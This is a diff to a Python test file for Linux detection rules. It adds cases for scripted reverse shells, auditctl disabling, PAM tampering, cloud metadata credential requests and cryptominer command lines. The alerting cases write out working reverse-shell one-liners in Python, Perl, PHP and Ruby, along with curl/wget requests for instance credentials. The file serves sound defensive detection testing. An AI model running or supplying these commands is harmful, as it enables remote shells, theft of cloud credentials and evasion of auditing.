@@ -23,6 +23,11 @@ DLPIPE = "Linux Download and Execute Piped to Shell"
 SUDOERS = "Sudoers Configuration Tampering"
 SSHD = "SSH Daemon Configuration Tampering"
 KEYS = "SSH authorized_keys Written"
+SCRIPTED = "Scripted Reverse Shell via Python, Perl, PHP or Ruby"
+AUDITCTL = "Linux Audit Rules Deleted or Auditing Disabled"
+PAM = "PAM Configuration or Module Tampering"
+METADATA = "Cloud Instance Metadata Credential Request from the Command Line"
+MINER = "Cryptominer Command Line"
 
 RULE_FILES = {
     BACKDOOR: "proc_creation_lnx_backdoor_account.yml",
@@ -35,6 +40,11 @@ RULE_FILES = {
     SUDOERS: "file_event_lnx_sudoers_tamper.yml",
     SSHD: "file_event_lnx_sshd_config_tamper.yml",
     KEYS: "file_event_lnx_ssh_authorized_keys.yml",
+    SCRIPTED: "proc_creation_lnx_scripted_reverse_shell.yml",
+    AUDITCTL: "proc_creation_lnx_auditctl_disabled.yml",
+    PAM: "file_event_lnx_pam_tamper.yml",
+    METADATA: "proc_creation_lnx_cloud_metadata_credentials.yml",
+    MINER: "proc_creation_lnx_cryptominer_cmdline.yml",
 }
 
 # (rule, Image, CommandLine, alerts)
@@ -99,6 +109,63 @@ PROCESS_CASES = [
     (DLPIPE, "/usr/bin/bash", "bash -c 'wget -qO- http://203.0.113.9/a | tar xz'", False),
     (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | tee a.sh'", False),
     (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a -o a.sh'", False),
+    # Scripted reverse shells: socket, connect and a shell, in a script interpreter.
+    (
+        SCRIPTED,
+        "/usr/bin/python3",
+        'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("203.0.113.9",4444));os.dup2(s.fileno(),0);pty.spawn("/bin/sh")\'',  # noqa: E501
+        True,
+    ),
+    (
+        SCRIPTED,
+        "/usr/bin/perl",
+        'perl -e \'use Socket;socket(S,PF_INET,SOCK_STREAM,6);connect(S,sockaddr_in(4444,inet_aton("203.0.113.9")));open(STDIN,">&S");exec("/bin/sh -i");\'',  # noqa: E501
+        True,
+    ),
+    (
+        SCRIPTED,
+        "/usr/bin/php8.2",
+        'php -r \'$s=fsockopen("203.0.113.9",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
+        True,
+    ),
+    (
+        SCRIPTED,
+        "/usr/bin/ruby",
+        'ruby -rsocket -e \'s=TCPSocket.open("203.0.113.9",4444);exec("/bin/sh -i")\'',
+        True,
+    ),
+    (SCRIPTED, "/usr/bin/python3", 'python3 -c "import socket;print(socket.gethostname())"', False),
+    (SCRIPTED, "/usr/bin/bash", "bash -c 'python3 -c socket.socket connect( dup2'", False),
+    # auditctl: -D and -e 0 only, case-sensitive.
+    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -D", True),
+    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -e 0", True),
+    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -e0", True),
+    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -e 1", False),
+    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -d exit,always -S open", False),
+    (AUDITCTL, "/usr/sbin/auditctl", "auditctl -l", False),
+    # Cloud metadata: credential paths only.
+    (
+        METADATA,
+        "/usr/bin/curl",
+        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
+        True,
+    ),
+    (
+        METADATA,
+        "/usr/bin/wget",
+        "wget -qO- http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        True,
+    ),
+    (
+        METADATA,
+        "/usr/bin/curl",
+        "curl -s http://169.254.169.254/latest/meta-data/instance-id",
+        False,
+    ),
+    # Miner command lines.
+    (MINER, "/tmp/.x/kworker", "kworker -o stratum+tcp://pool.example:3333 -u wallet", True),
+    (MINER, "/opt/miner", "miner --donate-level 1 -o pool.example:443", True),
+    (MINER, "/usr/bin/curl", "curl http://example.com:3333/health", False),
 ]
 
 PKG = "/usr/bin/dpkg"
@@ -113,6 +180,11 @@ FILE_CASES = [
     (KEYS, "/bin/sh", "/root/.ssh/authorized_keys", True),
     (KEYS, "/usr/bin/python3", "/home/app/.ssh/authorized_keys2", True),
     (KEYS, PKG, "/root/.ssh/authorized_keys", False),
+    (PAM, "/bin/sh", "/etc/pam.d/sshd", True),
+    (PAM, "/usr/bin/python3", "/lib/x86_64-linux-gnu/security/pam_unix.so", True),
+    (PAM, PKG, "/etc/pam.d/common-auth", False),
+    (PAM, "/usr/sbin/pam-auth-update", "/etc/pam.d/common-session", False),
+    (PAM, "/bin/sh", "/etc/hostname", False),
 ]
 
 
